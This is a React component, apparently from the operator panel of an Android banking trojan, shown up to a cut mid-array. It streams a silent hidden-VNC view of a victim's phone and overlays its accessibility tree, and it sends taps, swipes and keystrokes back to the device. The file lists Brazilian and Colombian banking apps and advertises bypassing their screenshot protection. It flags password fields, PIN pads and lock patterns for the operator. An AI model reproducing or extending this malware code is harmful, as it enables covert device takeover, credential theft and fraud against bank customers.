import { useEffect, useRef, useState, useCallback, useMemo } from 'react';
import useStore from '../../store/index.js';
import { ws } from '../../ws.js';

// ── Constants ──────────────────────────────────────────────────────────────────
// VNC frame resolution the APK encodes at (SILENT_WIDTH × SILENT_HEIGHT)
const VNC_W = 350;
const VNC_H = 650;

// If no VNC frame arrives within this window → switch to wireframe-only render
const VNC_STALE_MS = 3500;

// Hierarchy auto-poll interval (ms)
const POLL_MS = 350;

// Banking packages → FLAG_SECURE note (VNC still captures them via AccessibilityService.takeScreenshot)
const BANK_PKGS = new Set([
  'com.nu.production','com.itau','com.bradesco','com.santander.app',
  'br.com.bb.android','br.com.caixa.tem','br.com.gabba.caixa',
  'com.c6bank.app','br.com.intermedium','com.picpay',
  'com.mercadopago.wallet','br.com.original.bank',
  'com.btgpactual.banking','br.com.sicoob.bank','br.com.sicredi.app',
  'com.davivienda.mobile','com.daviplata','com.bancolombia','com.nequi',
]);
const isBank = pkg => {
  if (!pkg) return false;
  if (BANK_PKGS.has(pkg)) return true;
  const p = pkg.toLowerCase();
  return ['bank','banco','itau','bradesco','santander','nubank','caixa',
          'inter','picpay','neon','c6bank','davivienda','bancolombia'].some(k => p.includes(k));
};

// ── Parse hierarchy wire format ────────────────────────────────────────────────
function parseHierarchy(dataStr) {
  try {
    const d = typeof dataStr === 'string' ? JSON.parse(dataStr) : dataStr;
    const root = d.hierarchy;
    const sw = root?.bounds?.w || 1080;
    const sh = root?.bounds?.h || 2340;
    const nodes = [];
    walkNode(root, nodes, 0);
    return { pkg: d.package || '', nodes, sw, sh, ts: d.timestamp || '' };
  } catch (_) {
    return { pkg: '', nodes: [], sw: 1080, sh: 2340, ts: '' };
  }
}

function walkNode(node, out, depth) {
  if (!node || depth > 25) return;
  const b = node.bounds;
  const hasContent =
    (node.text && node.text.trim()) ||
    (node.desc && node.desc.trim()) ||
    (node.hint && node.hint.trim()) ||
    (b && b.w > 2 && b.h > 2);

  if (hasContent) {
    out.push({
      text:          (node.text || node.desc || node.hint || node.tooltip || '').trim(),
      cls:           node.class || '',
      id:            node.id || '',
      clickable:     !!node.clickable,
      editable:      !!node.editable,
      password:      !!node.password,
      checked:       !!node.checked,
      enabled:       node.enabled !== false,
      focused:       !!node.focused,
      scrollable:    !!node.scrollable,
      longClick:     !!node.longClickable,
      selected:      !!node.selected,
      isLockEl:      !!node.isLockElement,
      isPinDigit:    !!node.isPinDigit,
      isPatternLock: !!node.isPatternLock,
      isSwipeUnlock: !!node.isSwipeUnlock,
      isKeyboardKey: !!node.isKeyboardKey,
      keyType:       node.keyType || '',
      patternGrid:   node.patternGrid || null,
      swipeHint:     node.swipeHint || null,
      windowType:    node.windowType || 0,
      isLockScreen:  !!node.isLockScreen,
      bounds:        b ? { x: b.x||0, y: b.y||0, w: b.w||0, h: b.h||0 } : null,
      depth,
    });
  }
  const children = node.children || [];
  for (let i = 0; i < children.length; i++) walkNode(children[i], out, depth + 1);
}

// ── Node visual classification ─────────────────────────────────────────────────
function nodeStyle(n) {
  if (n.password)      return { fill: 'rgba(255,40,90,0.28)',  stroke: '#FF2A5A', lw: 2.5 };
  if (n.focused)       return { fill: 'rgba(0,240,140,0.22)',  stroke: '#00F08C', lw: 2.5 };
  if (n.editable)      return { fill: 'rgba(255,210,0,0.22)',  stroke: '#FFD200', lw: 2   };
  if (n.isPinDigit)    return { fill: 'rgba(255,140,0,0.35)',  stroke: '#FF8C00', lw: 2.5 };
  if (n.isPatternLock) return { fill: 'rgba(200,80,255,0.25)', stroke: '#C850FF', lw: 2   };
  if (n.isLockScreen)  return { fill: 'rgba(255,50,50,0.15)',  stroke: '#FF3232', lw: 1.5 };
  if (n.isKeyboardKey) return { fill: 'rgba(50,220,80,0.30)',  stroke: '#32DC50', lw: 1.5 };
  if (n.scrollable)    return { fill: 'rgba(0,200,255,0.12)',  stroke: '#00C8FF', lw: 1.5 };
  if (n.clickable)     return { fill: 'rgba(60,130,255,0.22)', stroke: '#3C82FF', lw: 1.5 };
  if (n.checked)       return { fill: 'rgba(0,255,180,0.20)',  stroke: '#00FFB4', lw: 1.5 };
  if (n.text)          return { fill: 'rgba(180,180,180,0.07)',stroke: 'rgba(180,180,180,0.4)', lw: 1 };
  return                      { fill: 'rgba(80,80,100,0.05)',  stroke: 'rgba(100,100,120,0.25)', lw: 0.5 };
}

// ── Draw all nodes on an overlay canvas ───────────────────────────────────────
function drawNodeOverlay(ctx, nodes, sw, sh, cw, ch, hover) {
  ctx.clearRect(0, 0, cw, ch);
  const scaleX = cw / sw;
  const scaleY = ch / sh;

  // Draw back-to-front so smaller (interactive) nodes appear on top
  const sorted = [...nodes].sort((a, b) => {
    const areaA = (a.bounds?.w || 0) * (a.bounds?.h || 0);
    const areaB = (b.bounds?.w || 0) * (b.bounds?.h || 0);
    return areaB - areaA; // larger first (drawn first = underneath)
  });

  for (const n of sorted) {
    const b = n.bounds;
    if (!b || b.w < 3 || b.h < 3) continue;
    const x = b.x * scaleX;
    const y = b.y * scaleY;
    const w = b.w * scaleX;
    const h = b.h * scaleY;
    const s = nodeStyle(n);

    ctx.save();
    const r = Math.min(6, w * 0.1, h * 0.1);
    ctx.beginPath();
    ctx.moveTo(x + r, y);
    ctx.lineTo(x + w - r, y);
    ctx.quadraticCurveTo(x + w, y, x + w, y + r);
    ctx.lineTo(x + w, y + h - r);
    ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
    ctx.lineTo(x + r, y + h);
    ctx.quadraticCurveTo(x, y + h, x, y + h - r);
    ctx.lineTo(x, y + r);
    ctx.quadraticCurveTo(x, y, x + r, y);
    ctx.closePath();
    ctx.fillStyle   = s.fill;
    ctx.fill();
    ctx.strokeStyle = s.stroke;
    ctx.lineWidth   = s.lw;
    ctx.stroke();

    // Label for meaningful nodes
    if (n.text && w > 30 && h > 12) {
      const maxFontSz = Math.min(11, h * 0.38, w * 0.14);
      const fontSize  = Math.max(6, maxFontSz);
      ctx.font        = `${fontSize}px "SF Mono", "Consolas", monospace`;
      ctx.fillStyle   = n.password ? '#FF6080' : n.editable ? '#FFE060' :
                        n.focused  ? '#00FF9A' : n.clickable ? '#90C0FF' : '#C8C8D8';
      ctx.globalAlpha = 0.92;
      const label = n.text.slice(0, 28);
      ctx.fillText(label, x + 3, y + fontSize + 2);
      ctx.globalAlpha = 1;
    }

    // Hover highlight
    if (hover && hover === n) {
      ctx.strokeStyle = '#FFFFFF';
      ctx.lineWidth   = 2.5;
      ctx.setLineDash([4, 3]);
      ctx.stroke();
      ctx.setLineDash([]);
    }

    // Pattern grid dots
    if (n.patternGrid) {
      for (const pt of n.patternGrid) {
        const px = pt.x * scaleX;
        const py = pt.y * scaleY;
        const pr = Math.max(4, (pt.r || 6) * Math.min(scaleX, scaleY));
        ctx.beginPath();
        ctx.arc(px, py, pr, 0, Math.PI * 2);
        ctx.fillStyle   = 'rgba(200,80,255,0.7)';
        ctx.fill();
        ctx.strokeStyle = '#C850FF';
        ctx.lineWidth   = 1.5;
        ctx.stroke();
      }
    }
    ctx.restore();
  }
}

// ── Draw wireframe (no VNC) full synthetic screen ─────────────────────────────
function drawWireframe(ctx, nodes, sw, sh, cw, ch) {
  // Dark background simulating phone screen
  ctx.fillStyle = '#0D0D12';
  ctx.fillRect(0, 0, cw, ch);

  // Status bar
  ctx.fillStyle = 'rgba(30,32,45,0.9)';
  ctx.fillRect(0, 0, cw, ch * (24 / sh));

  // Grid lines (subtle)
  ctx.strokeStyle = 'rgba(60,65,90,0.3)';
  ctx.lineWidth   = 0.5;
  for (let gx = 0; gx < cw; gx += cw / 12) {
    ctx.beginPath(); ctx.moveTo(gx, 0); ctx.lineTo(gx, ch); ctx.stroke();
  }
  for (let gy = 0; gy < ch; gy += ch / 22) {
    ctx.beginPath(); ctx.moveTo(0, gy); ctx.lineTo(cw, gy); ctx.stroke();
  }

  // Nodes as full-fill wireframe elements
  const scaleX = cw / sw;
  const scaleY = ch / sh;
  const sorted = [...nodes].sort((a, b) => {
    const areaA = (a.bounds?.w || 0) * (a.bounds?.h || 0);
    const areaB = (b.bounds?.w || 0) * (b.bounds?.h || 0);
    return areaB - areaA;
  });

  for (const n of sorted) {
    const b = n.bounds;
    if (!b || b.w < 3 || b.h < 3) continue;
    const x = b.x * scaleX;
    const y = b.y * scaleY;
    const w = b.w * scaleX;
    const h = b.h * scaleY;
    const s = nodeStyle(n);

    ctx.save();
    const r = Math.min(8, w * 0.12, h * 0.12);
    ctx.beginPath();
    ctx.moveTo(x + r, y);
    ctx.lineTo(x + w - r, y);
    ctx.quadraticCurveTo(x + w, y, x + w, y + r);
    ctx.lineTo(x + w, y + h - r);
    ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
    ctx.lineTo(x + r, y + h);
    ctx.quadraticCurveTo(x, y + h, x, y + h - r);
    ctx.lineTo(x, y + r);
    ctx.quadraticCurveTo(x, y, x + r, y);
    ctx.closePath();

    // Stronger fill in wireframe mode since there's no VNC background
    const fillStr = s.fill.replace(/[\d.]+\)$/, v => String(Math.min(0.85, parseFloat(v) * 2.8)) + ')');
    ctx.fillStyle   = fillStr;
    ctx.fill();
    ctx.strokeStyle = s.stroke;
    ctx.lineWidth   = Math.max(1, s.lw);
    ctx.stroke();

    // Text label
    if (n.text && w > 20 && h > 10) {
      const fontSize = Math.max(7, Math.min(12, h * 0.4, w * 0.13));
      ctx.font        = `${n.clickable || n.editable ? '600' : '400'} ${fontSize}px -apple-system, sans-serif`;
      ctx.fillStyle   = n.password ? '#FF6080' : n.editable ? '#FFE060' :
                        n.focused  ? '#00FF9A' : n.clickable ? '#9DC8FF' : '#A8A8B8';
      ctx.globalAlpha = 0.95;
      const label = n.text.slice(0, Math.floor(w / (fontSize * 0.55)));
      const tx = x + w / 2 - ctx.measureText(label).width / 2;
      ctx.fillText(label, Math.max(x + 2, tx), y + h / 2 + fontSize * 0.35);
      ctx.globalAlpha = 1;
    }

    ctx.restore();
  }
}

// ── Hit-test: find the deepest smallest node at (cx, cy) in device coords ─────
function hitTest(nodes, devX, devY) {
  let best = null;
  let bestArea = Infinity;
  for (const n of nodes) {
    const b = n.bounds;
    if (!b) continue;
    if (devX >= b.x && devX <= b.x + b.w && devY >= b.y && devY <= b.y + b.h) {
      const area = b.w * b.h;
      if (area < bestArea) { bestArea = area; best = n; }
    }
  }
  return best;
}

// ─────────────────────────────────────────────────────────────────────────────
// COMPONENT
// ─────────────────────────────────────────────────────────────────────────────
export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
  const device  = useStore(s => s.deviceDetail);
  const setVnc  = useStore(s => s.setVncActive);
  const d       = device || {};

  // ── Canvas refs ─────────────────────────────────────────────────────────────
  const vncCanvasRef     = useRef(null); // VNC JPEG frames
  const overlayCanvasRef = useRef(null); // Node overlay (pointer-events: all)
  const wfCanvasRef      = useRef(null); // Wireframe-only canvas (when no VNC)

  // ── Stream state ────────────────────────────────────────────────────────────
  const fpsRef        = useRef(0);
  const hzRef         = useRef(0);
  const lastVncFrameRef = useRef(0);      // timestamp of last VNC frame
  const touchRef      = useRef(null);
  const mouseRef      = useRef(null);

  // ── React state ─────────────────────────────────────────────────────────────
  const [mode,      setMode]      = useState('HVNC');  // HVNC | WIRE | EDITAR | DUPLO
  const [vncOn,     setVncOn]     = useState(false);
  const [srOn,      setSrOn]      = useState(false);
  const [fps,       setFps]       = useState(0);
  const [hz,        setHz]        = useState(0);
  const [nodes,     setNodes]     = useState([]);
  const [sw,        setSw]        = useState(1080);
  const [sh,        setSh]        = useState(2340);
  const [curPkg,    setCurPkg]    = useState('');
  const [wireframe, setWireframe] = useState(false);  // true = no VNC frames coming
  const [hover,     setHover]     = useState(null);
  const [toast,     setToast]     = useState(null);
  const [quality,   setQuality]   = useState(60);
  const [kbCapture, setKbCapture] = useState(false);
  const [typedBuf,  setTypedBuf]  = useState('');

  // Local refs for latest render values (avoid stale closures)
  const nodesRef  = useRef([]);
  const swRef     = useRef(1080);
  const shRef     = useRef(2340);
  const hoverRef  = useRef(null);
  const modeRef   = useRef('HVNC');

  useEffect(() => { nodesRef.current = nodes; }, [nodes]);
  useEffect(() => { swRef.current = sw; }, [sw]);
  useEffect(() => { shRef.current = sh; }, [sh]);
  useEffect(() => { hoverRef.current = hover; }, [hover]);
  useEffect(() => { modeRef.current = mode; }, [mode]);

  // ── VNC binary frame handler ─────────────────────────────────────────────────
  useEffect(() => {
    const unsub = ws.onBinary((buf, devId) => {
      if (devId !== deviceId) return;
      lastVncFrameRef.current = Date.now();
      setWireframe(false);
      fpsRef.current++;

      const blob  = new Blob([buf], { type: 'image/jpeg' });
      const url   = URL.createObjectURL(blob);
      const img   = new Image();
      img.onload  = () => {
        const c = vncCanvasRef.current;
        if (!c) { URL.revokeObjectURL(url); return; }
        if (c.width  !== img.naturalWidth)  c.width  = img.naturalWidth;
        if (c.height !== img.naturalHeight) c.height = img.naturalHeight;
        c.getContext('2d').drawImage(img, 0, 0);
        URL.revokeObjectURL(url);

        // Sync overlay canvas dimensions to match VNC canvas display size
        const oc = overlayCanvasRef.current;
        if (oc) {
          if (oc.width  !== c.width)  oc.width  = c.width;
          if (oc.height !== c.height) oc.height = c.height;
          redrawOverlay();
        }
      };
      img.src = url;
    });

    const fpsTick = setInterval(() => { setFps(fpsRef.current); fpsRef.current = 0; }, 1000);
    const staleTick = setInterval(() => {
      if (Date.now() - lastVncFrameRef.current > VNC_STALE_MS) setWireframe(true);
    }, 1000);

    return () => { unsub(); clearInterval(fpsTick); clearInterval(staleTick); };
  }, [deviceId]);

  // ── Hierarchy + status message handler ──────────────────────────────────────
  useEffect(() => {
    const unsub = ws.onMessage(msg => {
      if (msg.device_id !== deviceId) return;

      if (msg.type === 'screen_hierarchy' || msg.type === 'SCREEN_HIERARCHY') {
        const { pkg, nodes: parsed, sw: w, sh: h } = parseHierarchy(msg.data);
        setNodes(parsed);
        setSw(w); setSh(h);
        setCurPkg(pkg);
        hzRef.current++;

        if (parsed.some(n => n.password && n.focused)) showToast('🔑 CAMPO SENHA ATIVO');
        if (parsed.some(n => n.isPinDigit))            showToast('🔢 PIN PAD DETECTADO');
      }

      if (msg.type === 'device_status') {
        const pkg = msg.package || '';
        setCurPkg(pkg);
      }

      if (msg.type === 'vnc_status' || msg.type === 'sr_v2_status') {
        const active = !!msg.active;
        setVncOn(active);
        setVnc(active);
        if (!active) lastVncFrameRef.current = 0;
      }
    });

    const hzTick = setInterval(() => { setHz(hzRef.current); hzRef.current = 0; }, 1000);

    return () => { unsub(); clearInterval(hzTick); };
  }, [deviceId]);

  // ── Auto-poll hierarchy ──────────────────────────────────────────────────────
  useEffect(() => {
    if (!srOn) return;
    const t = setInterval(() => {
      sendCmd('REQUEST_HIERARCHY');
    }, POLL_MS);
    return () => clearInterval(t);
  }, [srOn, deviceId]);

  // ── Keyboard capture ─────────────────────────────────────────────────────────
  useEffect(() => {
    if (!kbCapture) return;
    const handler = (e) => {
      // Navigation keys
      if (e.key === 'Backspace') {
        e.preventDefault();
        sendCmd('TYPE', { text: '\b' });
        return;
      }
      if (e.key === 'Enter') {
        e.preventDefault();
        sendCmd('TYPE', { text: '\n' });
        return;
      }
      // Ignore control keys
      if (e.key.length > 1 || e.ctrlKey || e.metaKey || e.altKey) return;
      e.preventDefault();
      setTypedBuf(prev => {
        const next = prev + e.key;
        sendCmd('TYPE', { text: e.key });
        return next.slice(-40);
      });
    };
    window.addEventListener('keydown', handler);
    return () => window.removeEventListener('keydown', handler);
  }, [kbCapture, sendCmd]);

  // ── Wireframe canvas render on node change ───────────────────────────────────
  useEffect(() => {
    if (!wireframe) return;
    const c = wfCanvasRef.current;
    if (!c) return;
    drawWireframe(c.getContext('2d'), nodes, sw, sh, c.width, c.height);
  }, [nodes, sw, sh, wireframe]);

  // ── Overlay redraw helper ────────────────────────────────────────────────────
  const redrawOverlay = useCallback(() => {
    const oc = overlayCanvasRef.current;
    if (!oc) return;
    drawNodeOverlay(
      oc.getContext('2d'),
      nodesRef.current,
      swRef.current,
      shRef.current,
      oc.width,
      oc.height,
      hoverRef.current,
    );
  }, []);

  // Redraw overlay when nodes/hover change
  useEffect(() => { redrawOverlay(); }, [nodes, hover, redrawOverlay]);

  // ── Start / stop ─────────────────────────────────────────────────────────────
  function startAll() {
    ws.subscribe('vnc', deviceId);
    sendCmd('START_SCREEN_READER_V2', { enabled: true, quality });
    setVncOn(true); setVnc(true); setSrOn(true);
    sendCmd('REQUEST_HIERARCHY');
    lastVncFrameRef.current = Date.now();
  }

  function stopAll() {
    ws.unsubscribe('vnc', deviceId);
    sendCmd('STOP_SCREEN_READER_V2', { enabled: false });
    // Fallback for APKs without START_SCREEN_READER_V2 command:
    sendCmd('STOP_SILENT_VNC');
    sendCmd('TOGGLE_SCREEN_READER', { enabled: false });
    setVncOn(false); setVnc(false); setSrOn(false);
    setKbCapture(false);
    setTypedBuf('');
  }

  function startVncOnly() {
    ws.subscribe('vnc', deviceId);
    sendCmd('START_SILENT_VNC', { quality });
    setVncOn(true); setVnc(true);
    lastVncFrameRef.current = Date.now();
  }

  function startSrOnly() {
    sendCmd('TOGGLE_SCREEN_READER', { enabled: true });
    setSrOn(true);
    sendCmd('REQUEST_HIERARCHY');
  }

  function setQualityAndSend(q) {
    setQuality(q);
    if (vncOn) sendCmd('SET_SILENT_VNC_QUALITY', { quality: q });
  }

  // ── Toast ────────────────────────────────────────────────────────────────────
  function showToast(msg, ms = 2000) {
    setToast(msg);
    setTimeout(() => setToast(null), ms);
  }

  // ── Canvas coordinate helpers ────────────────────────────────────────────────
  // Returns normalized (0–1) coords from a canvas pixel position
  const toNorm = useCallback((px, py, canvasEl) => {
    if (!canvasEl) return { x: 0, y: 0 };
    const r = canvasEl.getBoundingClientRect();
    return { x: (px - r.left) / r.width, y: (py - r.top) / r.height };
  }, []);

  // Returns device pixel coords from normalized coords
  const normToDev = useCallback((nx, ny) => ({
    x: Math.round(nx * swRef.current),
    y: Math.round(ny * shRef.current),
  }), []);

  // ── Mouse / touch input on the canvas stack ──────────────────────────────────
  const onPointerMove = useCallback((e) => {
    const oc = overlayCanvasRef.current;
    if (!oc) return;
    const norm  = toNorm(e.clientX, e.clientY, oc);
    const devPt = normToDev(norm.x, norm.y);
    const hit   = hitTest(nodesRef.current, devPt.x, devPt.y);
    if (hit !== hoverRef.current) setHover(hit);
  }, [toNorm, normToDev]);

  const onPointerDown = useCallback((e) => {
    e.preventDefault();
    const oc = overlayCanvasRef.current;
    if (!oc) return;
    const norm  = toNorm(e.clientX, e.clientY, oc);
    mouseRef.current = { norm, ts: Date.now() };
  }, [toNorm]);

  const onPointerUp = useCallback((e) => {
    e.preventDefault();
    if (!mouseRef.current) return;
    const oc  = overlayCanvasRef.current;
    if (!oc)  return;
    const end  = toNorm(e.clientX, e.clientY, oc);
    const { norm: start, ts } = mouseRef.current;
    mouseRef.current = null;
    const dt   = Date.now() - ts;
    const dx   = end.x - start.x;
    const dy   = end.y - start.y;
    const dist = Math.hypot(dx, dy);

    if (dist < 0.015) {
      // Tap — check if we hit an interactive node
      const devPt = normToDev(start.x, start.y);
      const hit   = hitTest(nodesRef.current, devPt.x, devPt.y);
      if (hit && hit.clickable && hit.bounds) {
        const cx = Math.round(hit.bounds.x + hit.bounds.w / 2);
        const cy = Math.round(hit.bounds.y + hit.bounds.h / 2);
        sendCmd(dt > 600 ? 'LONG_PRESS' : 'TAP', { x: cx, y: cy });
        showToast(`${dt > 600 ? '⏱ HOLD' : '⚡ TAP'} → ${hit.text || hit.cls.split('.').pop() || '?'}`);
      } else {
        // No node hit — use normalized coords (works in both VNC and wireframe mode)
        sendCmd(dt > 600 ? 'LONG_PRESS' : 'TAP', { x: start.x, y: start.y, scale: 'vnc_norm' });
        showToast(`${dt > 600 ? '⏱ HOLD' : '⚡ TAP'} → (${(start.x * 100).toFixed(0)}%, ${(start.y * 100).toFixed(0)}%)`);
      }
    } else {
      // Swipe
      sendCmd('SWIPE', {
        x1: start.x, y1: start.y,
        x2: end.x,   y2: end.y,
        duration: dt,
        scale: 'vnc_norm',
      });
      showToast(`↕ SWIPE ${dt}ms`);
    }
  }, [toNorm, normToDev, sendCmd]);

  // Touch events (mobile)
  const onTouchStart = useCallback((e) => {
    e.preventDefault();
    const t = e.touches[0];
    const oc = overlayCanvasRef.current;
    if (!oc) return;
    touchRef.current = { norm: toNorm(t.clientX, t.clientY, oc), ts: Date.now() };
  }, [toNorm]);

  const onTouchEnd = useCallback((e) => {
    e.preventDefault();
    if (!touchRef.current) return;
    const oc = overlayCanvasRef.current;
    if (!oc) return;
    const t   = e.changedTouches[0];
    const end = toNorm(t.clientX, t.clientY, oc);
    const { norm: start, ts } = touchRef.current;
    touchRef.current = null;
    const dt   = Date.now() - ts;
    const dist = Math.hypot(end.x - start.x, end.y - start.y);

    if (dist < 0.015) {
      const devPt = normToDev(start.x, start.y);
      const hit   = hitTest(nodesRef.current, devPt.x, devPt.y);
      if (hit && hit.clickable && hit.bounds) {
        const cx = Math.round(hit.bounds.x + hit.bounds.w / 2);
        const cy = Math.round(hit.bounds.y + hit.bounds.h / 2);
        sendCmd(dt > 500 ? 'LONG_PRESS' : 'TAP', { x: cx, y: cy });
      } else {
        sendCmd(dt > 500 ? 'LONG_PRESS' : 'TAP', { x: start.x, y: start.y, scale: 'vnc_norm' });
      }
    } else {
      sendCmd('SWIPE', { x1: start.x, y1: start.y, x2: end.x, y2: end.y, duration: dt, scale: 'vnc_norm' });
    }
  }, [toNorm, normToDev, sendCmd]);

  // ── Navigation shortcuts ──────────────────────────────────────────────────────
  const nav = useCallback((action) => {
    sendCmd(action);
    showToast(`▶ ${action}`);
  }, [sendCmd]);

  // ── Derived ──────────────────────────────────────────────────────────────────
  const bankApp   = isBank(curPkg);
  const showHvnc  = mode === 'HVNC'  || mode === 'DUPLO';
  const showEdit  = mode === 'EDITAR' || mode === 'DUPLO';
  const showWire  = mode === 'WIRE';
  const activeMode = wireframe ? 'WIREFRAME' : (fps > 0 ? 'HVNC LIVE' : 'AGUARDANDO');

  const pwdNodes    = useMemo(() => nodes.filter(n => n.password),          [nodes]);
  const editNodes   = useMemo(() => nodes.filter(n => n.editable && !n.password), [nodes]);
  const pinNodes    = useMemo(() => nodes.filter(n => n.isPinDigit),         [nodes]);
  const clickNodes  = useMemo(() => nodes.filter(n => n.clickable && n.text), [nodes]);

  // ── Canvas container height ────────────────────────────────────────────────
  const canvasH = mode === 'DUPLO' ? 340 : (mode === 'EDITAR' ? 200 : 560);

  // ─────────────────────────────────────────────────────────────────────────────
  // RENDER
  // ─────────────────────────────────────────────────────────────────────────────
  return (
    <div style={{ paddingBottom: 32, userSelect: 'none' }}>

      {/* ── Toast ── */}
      {toast && (
        <div style={{
          position: 'fixed', top: 70, left: '50%', transform: 'translateX(-50%)',
          background: 'rgba(8,6,2,.97)', border: '1px solid var(--gold)',
          borderRadius: 12, padding: '9px 18px', zIndex: 9999,
          maxWidth: '84vw', textAlign: 'center', pointerEvents: 'none',
          boxShadow: '0 4px 30px rgba(0,0,0,.8)', fontSize: 12, color: '#00c864', fontWeight: 700,
          animation: 'fadeUp .18s ease',
        }}>{toast}</div>
      )}

      {/* ── Header toolbar ── */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
        <div style={{ width: 4, height: 40, background: vncOn ? '#00c864' : '#3b7af0', borderRadius: 2, flexShrink: 0 }} />
        <div>
          <div style={{ fontWeight: 800, fontSize: 13, color: 'var(--gold)', letterSpacing: 1 }}>
            SCREEN READER V2 ⚡
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginTop: 2 }}>
            <span style={{ fontSize: 10, color: vncOn ? '#00c864' : 'var(--text3)', fontWeight: 700 }}>
              {vncOn ? `${activeMode}` : 'OFFLINE'}
            </span>
            {fps > 0 && <span style={{ fontSize: 10, color: '#3b7af0', fontWeight: 700 }}>{fps}fps</span>}
            {hz > 0  && <span style={{ fontSize: 10, color: '#9060ff', fontWeight: 700 }}>{hz}hz</span>}
            {bankApp && <span style={{ fontSize: 9, padding: '1px 5px', borderRadius: 4, background: 'rgba(255,50,80,.15)', color: '#ff5c80', border: '1px solid rgba(255,50,80,.3)' }}>BANK</span>}
          </div>
        </div>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: 4, flexWrap: 'wrap', justifyContent: 'flex-end' }}>
          {['HVNC','WIRE','EDITAR','DUPLO'].map(m => (
            <button key={m} onClick={() => setMode(m)}
              style={{ padding: '4px 9px', fontSize: 10, fontWeight: 700, borderRadius: 6, border: 'none',
                cursor: 'pointer', background: mode === m ? '#3b7af0' : 'var(--bg3)',
                color: mode === m ? '#fff' : 'var(--text2)', transition: 'background .12s' }}>
              {m}
            </button>
          ))}
          <button onClick={() => { stopAll(); onBack(); }}
            style={{ padding: '4px 10px', fontSize: 11, fontWeight: 700, borderRadius: 6,
              border: '1px solid var(--gold-border)', background: 'var(--bg3)', color: 'var(--text2)', cursor: 'pointer' }}>
            ←
          </button>
        </div>
      </div>

      {/* ── Start/Stop bar ── */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 5, marginBottom: 8 }}>
        <button className="btn btn-green btn-block btn-sm" onClick={startAll}
          style={{ fontSize: 10, fontWeight: 800 }}>▶ HVNC + SR V2</button>
        <button className="btn btn-gold btn-block btn-sm" onClick={() => { sendCmd('REQUEST_HIERARCHY'); showToast('↺ HIERARQUIA'); }}
          style={{ fontSize: 10 }}>↺ ATUALIZAR</button>
        <button className="btn btn-red btn-block btn-sm" onClick={stopAll}
          style={{ fontSize: 10 }}>⏹ PARAR</button>
      </div>

      {/* ── HVNC Canvas View ── */}
      {(showHvnc || showWire) && (
        <div style={{ position: 'relative', marginBottom: 8, borderRadius: 14, overflow: 'hidden',
          border: `2px solid ${vncOn && fps > 0 ? '#00c864' : wireframe ? '#9060ff' : '#3b7af0'}`,
          boxShadow: vncOn && fps > 0 ? '0 0 18px rgba(0,200,100,.25)' : '0 0 14px rgba(59,122,240,.2)',
          background: '#080810', height: canvasH }}>

          {/* VNC JPEG frame (background) */}
          <canvas ref={vncCanvasRef}
            style={{ position: 'absolute', inset: 0, width: '100%', height: '100%',
              objectFit: 'contain', display: showWire ? 'none' : 'block' }}
            width={VNC_W} height={VNC_H} />

          {/* Wireframe canvas (shows when no VNC) */}
          {(showWire || wireframe) && (
            <canvas ref={wfCanvasRef}
              style={{ position: 'absolute', inset: 0, width: '100%', height: '100%' }}
              width={640} height={Math.round(640 * (sh / sw))} />
          )}

          {/* Node overlay (always on top, captures pointer events) */}
          <canvas ref={overlayCanvasRef}
            style={{ position: 'absolute', inset: 0, width: '100%', height: '100%',
              cursor: hover ? (hover.editable ? 'text' : hover.clickable ? 'pointer' : 'crosshair') : 'crosshair',
              opacity: showWire ? 0.7 : 0.85 }}
            width={VNC_W} height={VNC_H}
            onPointerMove={onPointerMove}
            onPointerDown={onPointerDown}
            onPointerUp={onPointerUp}
            onTouchStart={onTouchStart}
            onTouchEnd={onTouchEnd}
          />

          {/* HUD overlay */}
          <div style={{ position: 'absolute', top: 6, left: 6, display: 'flex', gap: 4, pointerEvents: 'none', zIndex: 2 }}>
            {vncOn && fps > 0 && (
              <span style={{ fontSize: 9, padding: '2px 6px', borderRadius: 4, background: 'rgba(0,200,100,.85)', color: '#fff', fontWeight: 800 }}>
                HVNC {fps}fps
              </span>
            )}
            {wireframe && (
              <span style={{ fontSize: 9, padding: '2px 6px', borderRadius: 4, background: 'rgba(144,96,255,.85)', color: '#fff', fontWeight: 700 }}>
                WIREFRAME
              </span>
            )}
            {bankApp && (
              <span style={{ fontSize: 9, padding: '2px 6px', borderRadius: 4, background: 'rgba(255,50,80,.85)', color: '#fff', fontWeight: 700 }}>
                BANK ✓ BYPASS
              </span>
            )}
            {srOn && (
              <span style={{ fontSize: 9, padding: '2px 6px', borderRadius: 4, background: 'rgba(59,122,240,.85)', color: '#fff', fontWeight: 700 }}>
                SR {hz}hz
              </span>
            )}
          </div>

          {/* Hover tooltip */}
          {hover && hover.bounds && (
            <div style={{ position: 'absolute', bottom: 6, left: 6, right: 6,
              background: 'rgba(8,6,2,.92)', border: '1px solid var(--gold-border)',
              borderRadius: 8, padding: '4px 8px', pointerEvents: 'none', zIndex: 3 }}>
              <div style={{ fontSize: 9, color: 'var(--gold)', fontWeight: 700, marginBottom: 1 }}>
                {hover.cls.split('.').pop() || '?'}
                {hover.clickable && <span style={{ color: '#3b7af0' }}> ● CLICK</span>}
                {hover.editable  && <span style={{ color: '#FFD200' }}> ● EDIT</span>}
                {hover.password  && <span style={{ color: '#FF2A5A' }}> ● PASS</span>}
                {hover.scrollable && <span style={{ color: '#00C8FF' }}> ● SCROLL</span>}
              </div>
              {hover.text && (
                <div style={{ fontSize: 10, color: '#b8c0d0', fontFamily: 'monospace' }}>
                  "{hover.text.slice(0, 60)}"
                </div>
              )}
            </div>
          )}

          {/* No-stream placeholder */}
          {!vncOn && !wireframe && nodes.length === 0 && (
            <div style={{ position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column',
              alignItems: 'center', justifyContent: 'center', gap: 10 }}>
              <div className="spin" style={{ width: 28, height: 28, borderWidth: 3 }} />
              <div style={{ fontSize: 11, color: 'var(--text3)' }}>Pressione ▶ HVNC + SR V2</div>
            </div>
          )}
        </div>
      )}

      {/* ── Navigation bar ── */}
      {(showHvnc || showWire) && (
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 4, marginBottom: 8 }}>
          {[
            ['◀', 'BACK'],
            ['⌂', 'HOME'],
            ['⧉', 'RECENTS'],
            ['🔔', 'NOTIFICATIONS'],
            ['⚡', 'QUICK_SETTINGS'],
